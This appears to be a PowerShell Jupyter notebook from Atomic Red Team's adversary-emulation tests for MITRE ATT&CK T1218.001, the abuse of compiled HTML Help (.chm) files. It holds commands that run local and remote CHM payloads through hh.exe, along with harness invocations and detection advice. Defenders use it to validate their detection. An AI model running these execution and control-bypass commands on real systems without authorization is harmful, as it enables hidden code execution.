{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5b513cd4",
   "metadata": {},
   "source": "# T1218.001 - Compiled HTML File\nAdversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)"
  },
  {
   "cell_type": "markdown",
   "id": "8c20c649",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "2950bc04",
   "metadata": {},
   "source": "### Atomic Test #1 - Compiled HTML Help Local Payload\nUses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The payload must exist on disk at specified location (#{local_chm_file})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile \"PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c07fe35",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d3e07c60",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nhh.exe PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc6cff4b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "f02761a4",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Compiled HTML Help Remote Payload",
    "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nhh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd8d6d6d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "cd752e8a",
   "metadata": {},
   "source": "### Atomic Test #3 - Invoke CHM with default Shortcut Command Execution\nExecutes a CHM file with the default Shortcut Command method.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f0d2947",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f78ee221",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0fb6198a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "64a41eed",
   "metadata": {},
   "source": "### Atomic Test #4 - Invoke CHM with InfoTech Storage Protocol Handler\nExecutes a CHM file with the ITS protocol handler.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd9be610",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "78314658",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1918362b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "39b3a66c",
   "metadata": {},
   "source": "### Atomic Test #5 - Invoke CHM Simulate Double click\nExecutes a CHM file simulating a user double click.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aafe2ea7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "9789dd50",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12dea88b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "c4f6bbff",
   "metadata": {},
   "source": "### Atomic Test #6 - Invoke CHM with Script Engine and Help Topic\nExecutes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6b3e8772",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4e025d31",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42fca5a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "c6845df0",
   "metadata": {},
   "source": "### Atomic Test #7 - Invoke CHM Shortcut Command with ITS and Help Topic\nExecutes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9953f3a7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "03dc2840",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f37a17cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "d8756a92",
   "metadata": {},
   "source": "### Atomic Test #8 - Decompile Local CHM File\nUses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The payload must exist on disk at specified location (#{local_chm_file})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile \"PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "18cadef0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "723f2f90",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nhh.exe -decompile %temp% PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "497ddade",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "df32efc1",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\T1218.001.html >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6fbbe2a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.001 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bbe2165e",
   "metadata": {},
   "source": "## Detection\nMonitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.\n\nMonitor presence and use of CHM files, especially if they are not typically used within an environment."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}